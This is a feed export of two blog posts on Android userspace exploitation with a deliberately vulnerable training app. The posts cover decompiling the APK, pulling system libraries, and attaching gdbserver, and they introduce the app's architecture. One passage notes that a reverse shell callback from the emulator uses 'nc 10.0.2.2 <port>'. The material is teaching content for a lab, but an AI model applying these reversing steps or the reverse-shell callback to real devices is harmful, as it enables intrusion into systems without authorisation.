&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ jadx-gui ./base.apk
...
&lt;/code>&lt;/pre>&lt;/div>&lt;p>This decompiles a large portion of the app. Continuing the example of the &lt;em>OffByOneModule&lt;/em>, we can get the following decompiled code for the &lt;code>OffByOneModule&lt;/code> class:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-Java" data-lang="Java">&lt;span style="color:#f92672">package&lt;/span> com.damnvulnerableapp.vulnerable.modules&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> com.damnvulnerableapp.common.exceptions.VulnerableModuleException&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">/* loaded from: classes10.dex */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">OffByOneModule&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> VulnerableModule &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">native&lt;/span> &lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#a6e22e">logMessage&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> bArr&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">loadLibrary&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;OffByOneModule&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">OffByOneModule&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">super&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> OffByOneModuleConfiguration&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span> &lt;span style="color:#75715e">// com.damnvulnerableapp.vulnerable.modules.VulnerableModule
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> VulnerableModuleException &lt;span style="color:#f92672">{&lt;/span>
output&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Welcome to the most secure message logger in the world!&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">true&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
output&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Enter a message to log: &amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> message &lt;span style="color:#f92672">=&lt;/span> input&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>message &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
output&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Failed to receive the message to log...Better safe than sorry!&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> String&lt;span style="color:#f92672">(&lt;/span>message&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;EXIT&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
output&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Your logged message(s) were stored successfully.&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
output&lt;span style="color:#f92672">(&lt;/span>logMessage&lt;span style="color:#f92672">(&lt;/span>message&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="grabbing-system-libraries">Grabbing System Libraries&lt;/h3>
&lt;p>Often there are libraries, of which we have a leaked pointer. Having such a pointer is nice and all, but it will not help, if we do not have access to the corresponding shared - object file. Lets try to get access to &lt;code>libart.so&lt;/code>, the android runtime that runs the Java code we wrote for the app. Among other things, it handles native calls via trampoline functions like &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:art/runtime/arch/x86_64/quick_entrypoints_x86_64.S;l=1536">&lt;code>art_quick_generic_jni_trampoline&lt;/code>&lt;/a>.&lt;/p>
&lt;p>In order to find &lt;code>libart.so&lt;/code>, again assuming root access, running the &lt;em>damnvulnerableapp&lt;/em> reveals the binary that underlies the process:&lt;/p>
&lt;pre tabindex="0">&lt;code># ps -e | grep damn
u0_a107 4122 357 13798620 114268 do_epoll_wait 0 S com.damnvulnerableapp
# file /proc/4122/exe
/proc/4122/exe: symbolic link to /system/bin/app_process64
# readelf -d /system/bin/app_process64
...
0x0000000000000001 (NEEDED) Shared library: [libandroid_runtime.so]
0x0000000000000001 (NEEDED) Shared library: [libbinder.so]
0x0000000000000001 (NEEDED) Shared library: [libcutils.so]
0x0000000000000001 (NEEDED) Shared library: [libhidlbase.so]
0x0000000000000001 (NEEDED) Shared library: [liblog.so]
0x0000000000000001 (NEEDED) Shared library: [libnativeloader.so]
0x0000000000000001 (NEEDED) Shared library: [libsigchain.so]
0x0000000000000001 (NEEDED) Shared library: [libutils.so]
0x0000000000000001 (NEEDED) Shared library: [libwilhelm.so]
0x0000000000000001 (NEEDED) Shared library: [libc++.so]
0x0000000000000001 (NEEDED) Shared library: [libc.so]
0x0000000000000001 (NEEDED) Shared library: [libm.so]
0x0000000000000001 (NEEDED) Shared library: [libdl.so]
...
&lt;/code>&lt;/pre>&lt;p>This means that &lt;code>libart.so&lt;/code> will be loaded later on, i.e. not at startup. Further analysis reveals:&lt;/p>
&lt;pre tabindex="0">&lt;code># cat /proc/4122/maps | grep libart.so
730c03400000-730c0357b000 r--p 00000000 fe:0f 57 /apex/com.android.art/lib64/libart.so
730c0377a000-730c03e0b000 r-xp 0017a000 fe:0f 57 /apex/com.android.art/lib64/libart.so
730c0400a000-730c0401d000 r--p 0080a000 fe:0f 57 /apex/com.android.art/lib64/libart.so
730c0421c000-730c04220000 rw-p 0081c000 fe:0f 57 /apex/com.android.art/lib64/libart.so
# exit
$ adb pull /apex/com.android.art/lib64/libart.so ./libart.so
&lt;/code>&lt;/pre>&lt;p>After the above commands, &lt;code>libart.so&lt;/code> should be in our current working directory, ready to be analyzed via &lt;em>Ghidra&lt;/em>, &lt;a href="https://man7.org/linux/man-pages/man1/objdump.1.html">&lt;em>objdump&lt;/em>&lt;/a>(which will most likely not work, because &lt;em>objdump&lt;/em> does not recognize the architecture) or &lt;a href="https://man7.org/linux/man-pages/man1/readelf.1.html">&lt;em>readelf&lt;/em>&lt;/a>.&lt;/p>
&lt;p>There may be two unexpected aspects:&lt;/p>
&lt;ol>
&lt;li>Even if you do &lt;strong>not&lt;/strong> have root access on the emulator, it is possible to run &lt;code>adb pull &amp;lt;from remote&amp;gt; &amp;lt;to local&amp;gt;&lt;/code>. We only used root to access &lt;code>/proc/4122/maps&lt;/code> etc.&lt;/li>
&lt;li>The name of the binary that underlies &lt;em>damnvulnerableapp&lt;/em> is &lt;code>/system/bin/app_process64&lt;/code>. To that end, observe that Java apps are &lt;a href="https://link.springer.com/article/10.1007/s10207-018-00425-8">forked from the zygote process&lt;/a>. The zygote process, among other things, initializes the JVM to allow for faster app starts.&lt;/li>
&lt;/ol>
&lt;h3 id="analysing-the-stack-trace">Analysing the Stack Trace&lt;/h3>
&lt;p>There is one more thing to consider. When given a leak, e.g. an address from the stack, then it is important to (partially) understand what values are located on the stack. To that end, one may write a small native app via &lt;em>Android Studio&lt;/em>, set a breakpoint on the native function and run the app. This could result in the following stack trace:&lt;/p>
&lt;pre tabindex="0">&lt;code>Java_com_damnvulnerableapp_vulnerable_modules_EasyStackBufferOverflowModule_vulnerableToUpper EasyStackBufferOverflowModule.c:32
art_quick_generic_jni_trampoline 0x000071636dba032c
art_quick_invoke_stub 0x000071636db95015
art::ArtMethod::Invoke(art::Thread *, unsigned int *, unsigned int, art::JValue *, const char *) 0x000071636dc1d9fb
art::interpreter::ArtInterpreterToCompiledCodeBridge(art::Thread *, art::ArtMethod *, art::ShadowFrame *, unsigned short, art::JValue *) 0x000071636dda335d
art::interpreter::DoCall&amp;lt;…&amp;gt;(art::ArtMethod *, art::Thread *, art::ShadowFrame &amp;amp;, const art::Instruction *, unsigned short, art::JValue *) 0x000071636dd9d16d
art::interpreter::ExecuteSwitchImplCpp&amp;lt;…&amp;gt;(art::interpreter::SwitchImplContext *) 0x000071636dbac1d0
ExecuteSwitchImplAsm 0x000071636dba23d6
art::interpreter::ExecuteSwitch(art::Thread *, const art::CodeItemDataAccessor &amp;amp;, art::ShadowFrame &amp;amp;, art::JValue, bool) 0x000071636dd9ca6e
art::interpreter::Execute(art::Thread *, const art::CodeItemDataAccessor &amp;amp;, art::ShadowFrame &amp;amp;, art::JValue, bool, bool) 0x000071636dd94ae1
art::interpreter::ArtInterpreterToInterpreterBridge(art::Thread *, const art::CodeItemDataAccessor &amp;amp;, art::ShadowFrame *, art::JValue *) 0x000071636dd9c55c
art::interpreter::DoCall&amp;lt;…&amp;gt;(art::ArtMethod *, art::Thread *, art::ShadowFrame &amp;amp;, const art::Instruction *, unsigned short, art::JValue *) 0x000071636dd9d14e
MterpInvokeVirtual 0x000071636e16e306
mterp_op_invoke_virtual 0x000071636db7e71a
art::interpreter::Execute(art::Thread *, const art::CodeItemDataAccessor &amp;amp;, art::ShadowFrame &amp;amp;, art::JValue, bool, bool) 0x000071636dd94b43
art::interpreter::ArtInterpreterToInterpreterBridge(art::Thread *, const art::CodeItemDataAccessor &amp;amp;, art::ShadowFrame *, art::JValue *) 0x000071636dd9c55c
art::interpreter::DoCall&amp;lt;…&amp;gt;(art::ArtMethod *, art::Thread *, art::ShadowFrame &amp;amp;, const art::Instruction *, unsigned short, art::JValue *) 0x000071636dd9d14e
MterpInvokeVirtual 0x000071636e16e306
mterp_op_invoke_virtual 0x000071636db7e71a
art::interpreter::Execute(art::Thread *, const art::CodeItemDataAccessor &amp;amp;, art::ShadowFrame &amp;amp;, art::JValue, bool, bool) 0x000071636dd94b43
art::interpreter::ArtInterpreterToInterpreterBridge(art::Thread *, const art::CodeItemDataAccessor &amp;amp;, art::ShadowFrame *, art::JValue *) 0x000071636dd9c55c
art::interpreter::DoCall&amp;lt;…&amp;gt;(art::ArtMethod *, art::Thread *, art::ShadowFrame &amp;amp;, const art::Instruction *, unsigned short, art::JValue *) 0x000071636dd9d14e
MterpInvokeInterface 0x000071636e175bfd
mterp_op_invoke_interface 0x000071636db7e91a
art::interpreter::Execute(art::Thread *, const art::CodeItemDataAccessor &amp;amp;, art::ShadowFrame &amp;amp;, art::JValue, bool, bool) 0x000071636dd94b43
artQuickToInterpreterBridge 0x000071636e159a70
art_quick_to_interpreter_bridge 0x000071636dba04bd
&amp;lt;unknown&amp;gt; 0x000071636dba07c0
&lt;/code>&lt;/pre>&lt;p>This is a stack - trace of a module that will be exploited in a later post. The most important address is the return address of &lt;code>Java_com_damnvulnerableapp_vulnerable_modules_EasyStackBufferOverflowModule_vulnerableToUpper&lt;/code>, i.e the address into &lt;code>art_quick_generic_jni_trampoline: 0x000071636dba032c&lt;/code>. Depending on whether the native method is e.g. declared as &lt;code>static&lt;/code> or not, &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:art/runtime/art_method.cc;l=369">different stubs&lt;/a> are called, which may result in different return addresses. Thus it might be beneficial to produce a small sample app with the same setup as the target app, especially w.r.t. access modifiers etc. of the native method, to get an idea of the stack - trace.&lt;/p>
&lt;h3 id="debugging-on-android">Debugging on Android&lt;/h3>
&lt;p>Another very important aspect of binary exploitation is &lt;em>debugging&lt;/em>. There are a lot of good resources out there (like &lt;a href="https://simoneaonzo.it/gdb-android/">1&lt;/a>, &lt;a href="https://wladimir-tm4pda.github.io/porting/debugging_gdb.html">2&lt;/a>). One possible debugger is &lt;a href="https://man7.org/linux/man-pages/man1/gdb.1.html">&lt;em>GDB&lt;/em>&lt;/a>. As &lt;em>GDB&lt;/em> by itself is pretty hard to use, I will use an extensions in this series, called &lt;a href="https://github.com/hugsy/gef">&lt;em>GEF&lt;/em>&lt;/a>. A prerequisite is that we have root access on the device/emulator.&lt;/p>
&lt;h4 id="starting-an-app-from-terminal">Starting an app from terminal&lt;/h4>
&lt;p>In order to debug an app, the app needs to run. In this case, as we are using a &amp;ldquo;special&amp;rdquo; app, we just need to run it without waiting for a debugger to attach. Running an app can be done as follows:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ adb shell &lt;span style="color:#e6db74">&amp;#34;am start -n com.damnvulnerableapp/com.damnvulnerableapp.managerservice.ManagerActivity&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here we assume that the app of choice is the &lt;em>DamnVulnerableApp&lt;/em>, which is the main focus of this series.&lt;/p>
&lt;p>From here onwards, the manager will run in the background and wait for incoming connections. Once a connection is established, the messages will be used to tell the manager what to do, like spawning a vulnerable module.&lt;/p>
&lt;h4 id="starting-an-exploit-script">Starting an exploit script&lt;/h4>
&lt;p>Assuming that connecting to a socket server is not a great challenge, right after the connection has been established and a vulnerable module selected, the exploit script should wait for the debugger to attach. This can be achieved like demonstrated in the following:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># Need tcp forward, i.e. &amp;#39;adb forward tcp:8080 tcp:8080&amp;#39;&lt;/span>
client &lt;span style="color:#f92672">=&lt;/span> PwnClient(&lt;span style="color:#e6db74">&amp;#39;127.0.0.1&amp;#39;&lt;/span>, &lt;span style="color:#ae81ff">8080&lt;/span>)
client&lt;span style="color:#f92672">.&lt;/span>select(&lt;span style="color:#e6db74">&amp;#39;EasyStackBufferOverflowModule&amp;#39;&lt;/span>)
print(client&lt;span style="color:#f92672">.&lt;/span>fetch())
input(&lt;span style="color:#e6db74">&amp;#39;Press &amp;lt;enter&amp;gt; to continue...&amp;#39;&lt;/span>)
&lt;span style="color:#f92672">...&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>This is not &lt;em>the clean way&lt;/em>, but it works just fine.&lt;/p>
&lt;h4 id="attaching-gdb">Attaching gdb&lt;/h4>
&lt;p>Notice that selecting a module should spawn a new process that encapsulates the vulnerable module. Now we need a &lt;em>gdbserver&lt;/em>, which is part of the &lt;a href="https://developer.android.com/ndk">&lt;em>Android NDK&lt;/em>&lt;/a>. Uploading the &lt;em>gdbserver&lt;/em> to e.g. &lt;code>/data/local/tmp/gdbserver&lt;/code> will enable us to attach to running processes. The command history could look like this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ adb push gdbserver /data/local/tmp/gdbserver
$ adb shell &lt;span style="color:#e6db74">&amp;#34;chmod 777 /data/local/tmp/gdbserver&amp;#34;&lt;/span>
$ adb forward tcp:1337 tcp:1337
$ adb shell &lt;span style="color:#e6db74">&amp;#34;/data/local/tmp/gdbserver :1337 --attach &lt;/span>&lt;span style="color:#66d9ef">$(&lt;/span>pidof com.damnvulnerableapp:VulnerableActivity&lt;span style="color:#66d9ef">)&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
...
Listening on port &lt;span style="color:#ae81ff">1337&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We will make &lt;em>gdb&lt;/em> connect to port &lt;code>1337&lt;/code> for debugging. After the last command, the process will block until a debugger connects. Before that, we should provide gdb with all necessary symbol information that is helpful for debugging. Namely (inspired from &lt;a href="https://simoneaonzo.it/gdb-android/">here&lt;/a>):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ mkdir ~/dbgtmp
$ adb pull /system/lib64 ~/dbgtmp
$ mkdir ~/dbgtmp/tmp
$ adb pull /apex/com.android.art/lib64 ~/dbgtmp/tmp
$ mv ~/dbgtmp/tmp/* ~/dbgtmp/lib64
$ cp ~/path/to/unpacked/apk/lib/x86_64/* ~/dbgtmp/lib64
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then, in &lt;em>gdb/gef&lt;/em> (taken from &lt;a href="https://wladimir-tm4pda.github.io/porting/debugging_gdb.html">here&lt;/a> and &lt;a href="https://simoneaonzo.it/gdb-android/">here&lt;/a>):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">gef➤ set solib-absolute-prefix ~/dbgtmp/
gef➤ set solib-search-path ~/dbgtmp/lib64/
gef➤ gef-remote :1337
...
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Connected to &lt;span style="color:#e6db74">&amp;#39;:1337&amp;#39;&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Remote information loaded to temporary path &lt;span style="color:#e6db74">&amp;#39;/tmp/gef/6695&amp;#39;&lt;/span>
gef➤ sharedlibrary
...
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The last command will take &lt;strong>ages&lt;/strong> to run, but its worth as we get access to almost all symbols we need (there is most likely a better way to do this). Basically we just need to do this once with all the libraries, then identify the libraries we are interested in and create a directory next to &lt;code>lib64&lt;/code> on our local machine that only contains this interesting subset of the shared - object files. This will speed up loading time by a lot!&lt;/p>
&lt;h2 id="summary">Summary&lt;/h2>
&lt;p>We have seen some security mechanisms that will make the life of an attacker harder. Depending on the assumptions, like e.g. leaking an address, some mechanisms can be rendered useless. Also, we are now able to get limited source code access and debug Android apps using &lt;code>gdb&lt;/code>. This will allow us to exploit the available modules in &lt;em>damnvulnerableapp&lt;/em>.&lt;/p></content></item><item><title>Diving into the art of userspace exploitation under Android - Introducing E²VA (Part 1)</title><link>https://lolcads.github.io/posts/2022/11/diving_into_the_art_of_userspace_exploitation_under_android/</link><pubDate>Mon, 21 Nov 2022 18:54:42 +0100</pubDate><guid>https://lolcads.github.io/posts/2022/11/diving_into_the_art_of_userspace_exploitation_under_android/</guid><description>Investigating Binary Exploitation for JNI on Android This post aims to be an introduction into a blog series about binary exploitation on Android. It tries to describe how the environment that runs vulnerable modules is set up and how the damnvulnerableapp supports the process of binary exploitation on Android.
Warning The following app is intended to be vulnerable to specific attacks and can result in arbitrary code execution in the context of the app.</description><content>&lt;h1 id="investigating-binary-exploitation-for-jni-on-android">Investigating Binary Exploitation for JNI on Android&lt;/h1>
&lt;p>This post aims to be an introduction into a blog series about binary exploitation on Android. It tries to describe how the environment that runs vulnerable modules is set up and how the &lt;em>damnvulnerableapp&lt;/em> supports the process of binary exploitation on Android.&lt;/p>
&lt;h2 id="warning">Warning&lt;/h2>
&lt;p>The following app is intended to be vulnerable to specific attacks and can result in arbitrary code execution in the context of the app. Therefore, beware of this and do not use this app on a device/emulator that contains personal information whatsoever. Always launch the app in a controlled environment. &lt;strong>No authentication&lt;/strong> is necessary to connect to the app and talk to vulnerable modules. Assuming the app is free of bugs, there is a guarantee that only one client can connect at a time.&lt;/p>
&lt;h2 id="esup2supva-the-damnvulnerableapp">&lt;em>E&lt;!-- raw HTML omitted -->2&lt;!-- raw HTML omitted -->VA&lt;/em>, the &lt;em>damnvulnerableapp&lt;/em>&lt;/h2>
&lt;p>In order to properly investigate binary exploitation on Android, an app has been written that allows for running custom vulnerable modules, i.e. Java classes with one entry point, in a separate process. It is remotely controllable and constructed in a way that allows to (re-)run a module multiple times even when it crashed.&lt;/p>
&lt;p>The app is named &lt;strong>E&lt;!-- raw HTML omitted -->2&lt;!-- raw HTML omitted -->VA&lt;/strong>, i.e. &lt;em>Exploitation Experience (with) Vulnerable App&lt;/em>. Within this blog series, &lt;em>E&lt;!-- raw HTML omitted -->2&lt;!-- raw HTML omitted -->VA&lt;/em> and &lt;em>damnvulnerableapp&lt;/em> will be used interchangably, so do not get confused!&lt;/p>
&lt;p>The core of the &lt;em>damnvulnerableapp&lt;/em> is a background service, called &lt;em>manager&lt;/em>, that handles communication with external users (only one at a time) and translates the messages received into actions to perform. Among other things, the most important actions are:&lt;/p>
&lt;ol>
&lt;li>Selecting a vulnerable module to be run in a &lt;strong>separate process&lt;/strong>. This has to be done, because it is &lt;strong>very&lt;/strong> likely that the vulnerable module will crash in case we mess up with an exploit.&lt;/li>
&lt;li>Exiting a vulnerable module. This will shutdown the process that hosts the vulnerable module and revert back to a selection state.&lt;/li>
&lt;li>Forwarding messages to the vulnerable module. It is possible to forward arbitrary binary data. Of course it is up to the module to accept this or not. E.g. if a vulnerable module internally calls &lt;code>strcpy&lt;/code>, sending arbitrary binary data will probably not do the trick.&lt;/li>
&lt;li>Fetching messages from the vulnerable module. When sending a fetch request, the &lt;em>manager&lt;/em> will try to read data from the vulnerable module. Depending on the configurations, this can time out or block forever.&lt;/li>
&lt;/ol>
&lt;p>Therefore, the usual steps are:&lt;/p>
&lt;ol>
&lt;li>Select a module&lt;/li>
&lt;li>Forward and fetch data until done, i.e. either until the process crashes or exits by itself or is instructed by an external user to terminate.&lt;/li>
&lt;li>Optionally, when trying to terminate the hosting process, &lt;em>manager&lt;/em> can be instructed to do so.&lt;/li>
&lt;/ol>
&lt;p>As regards selecting a module, the following diagram tries to illustrate this process:
&lt;img src="https://lolcads.github.io/2022/11/eva_0_request_example_2.svg" alt="Selecting a module">&lt;/p>
&lt;p>Notice that the &lt;em>Zygote&lt;/em> process is responsible for creating a new activity by forking. Therefore, the vulnerable process will contain e.g. the same canary as the manager app, which was also forked from &lt;em>Zygote&lt;/em>.&lt;/p>
&lt;p>In addition to selecting a module, the next diagram describes how data is fetched from a module and sent to an external user:
&lt;img src="https://lolcads.github.io/2022/11/eva_0_request_example_3.svg" alt="Forwarding message to a module">&lt;/p>
&lt;p>If a vulnerable module crashes, e.g. due to a failed exploitation attempt, then the &lt;em>manager&lt;/em> will detect this and revert back to the selection state. Therefore, one may select a new module immediately after the old module crashed. It is advised to &lt;strong>not&lt;/strong> flood &lt;em>manager&lt;/em> with commands as it takes time to spawn a process or detect that a process died. The latter heavily depends on the configurations and the module&amp;rsquo;s content.&lt;/p>
&lt;p>Also, the app requires specific privileges in order to avoid being rendered irresponsive after some time (often after 10s). To that end the app requests &lt;a href="https://developer.android.com/reference/android/provider/Settings#ACTION_MANAGE_OVERLAY_PERMISSION">&lt;code>ACTION_MANAGE_OVERLAY_PERMISSION&lt;/code>&lt;/a> (which is a runtime permission that can be dangerous, so please run the app on a device/emulator that does not contain personal information whatsoever, just in case &lt;em>damnvulnerableapp&lt;/em> gets hijacked by someone other than you). This permission seems to keep the &lt;em>manager&lt;/em> alive.&lt;/p>
&lt;h3 id="architecture">Architecture&lt;/h3>
&lt;p>&lt;em>damnvulnerableapp&lt;/em> is tested on an x86_64 Pixel 3 emulator that runs Android 12.0.0. The build number is &lt;a href="https://source.android.com/docs/setup/about/build-numbers#build-ids-defined">&lt;code>SE1A.220203.002.A1&lt;/code>&lt;/a>. Therefore, all exploits that involve shellcode will contain x86_64 assembly.&lt;/p>
&lt;h3 id="running-vulnerable-modules">Running Vulnerable Modules&lt;/h3>
&lt;p>Assuming there is a vulnerable module to be run, the &lt;em>manager&lt;/em> can be started from &lt;a href="https://developer.android.com/studio">&lt;em>Android Studio&lt;/em>&lt;/a> or via &lt;a href="https://developer.android.com/studio/command-line/adb">&lt;code>adb&lt;/code>&lt;/a>. Also &lt;em>damnvulnerableapp&lt;/em> should be launched in debug mode. Technically speaking, there is no need to start the app from &lt;em>Android Studio&lt;/em> other than being able to attach &lt;em>lldb&lt;/em> to the vulnerable module, as well as to adjust configurations to avoid timeouts etc. In order to get to more realistic binary exploitation, one should start with the &lt;code>.apk&lt;/code> file, start the app from console and go from there.&lt;/p>
&lt;p>Another thing to consider is that one should &lt;strong>not&lt;/strong> try to call e.g. &lt;code>execve&lt;/code> in the vulnerable process. This comes from the fact that e.g. &lt;code>execve&lt;/code> will &amp;ldquo;destroy&amp;rdquo; the actual vulnerable process, thus shutting down the connection to &lt;em>manager&lt;/em>. As &lt;em>manager&lt;/em> will assume the process to be dead, because the connection broke, it will attempt to fully kill remnants of the vulnerable process and then revert back to a select state. Thus, calling e.g. &lt;code>execve&lt;/code> dooms the vulnerabe process to be destroyed by &lt;em>manager&lt;/em>. One may think of this as an additional security mechanism, or just a reminder that stealthy exploits are cooler than loud one - shot exploits.&lt;/p>
&lt;h4 id="types-of-vulnerable-modules">Types of vulnerable modules&lt;/h4>
&lt;p>In order to allow for as many perspectives as possible for binary exploitation on Android, each vulnerable module encapsulates one of the following:&lt;/p>
&lt;ol>
&lt;li>a completely different vulnerability class than all the other modules. E.g. &lt;em>buffer - overflow&lt;/em> vs. &lt;em>use - after - free&lt;/em>.&lt;/li>
&lt;li>a slightly modified version of a fixed vulnerability class. E.g. a &lt;em>use - after - free&lt;/em> vulnerability can result in a &lt;em>Write - What - Where&lt;/em> condition or in an attacker being able to execute a chosen function, depending on the implementation.&lt;/li>
&lt;/ol>
&lt;p>Consider the composition of a vulnerable module:
&lt;img src="https://lolcads.github.io/2022/11/eva_0_composition.svg" alt="Composition of vulnerable modules">&lt;/p>
&lt;p>As can be seen in the above diagram, every (currently) module uses JNI functions to introduce vulnerabilities to be exploited. This is where binary exploitation becomes applicable to Java, namely due to native function calls.&lt;/p>
&lt;h4 id="communication-with-vulnerable-modules">Communication with vulnerable modules&lt;/h4>
&lt;p>&lt;em>damnvulnerableapp&lt;/em> will listen for incoming connections on port &lt;code>8080&lt;/code>. If it is run on an emulator, an external user may connect through &lt;code>nc 127.0.0.1 8080&lt;/code>. Before this is possible, one needs to run&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ adb forward tcp:8080 tcp:8080
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Otherwise, establishing a connection is refused. When trying to create a callback (or reverse shell etc.) in an emulator, i.e. establishing a connection from the emulator to the host, use &lt;code>nc 10.0.2.2 &amp;lt;port&amp;gt;&lt;/code>. According to &lt;a href="https://developer.android.com/studio/run/emulator-networking">docs&lt;/a>, &lt;code>10.0.2.2&lt;/code> is a &amp;ldquo;special alias to your host loopback interface&amp;rdquo;.&lt;/p>
&lt;p>The &lt;em>manager&lt;/em> will only react to messages from an external user, i.e. it uses a &lt;em>request - response&lt;/em> model to handle communication. Therefore, an external agent must not assume that it will be informed if the vulnerable module has a non - empty output queue. An external user always has to explicitly ask the &lt;em>manager&lt;/em> to fetch available output data.&lt;/p>
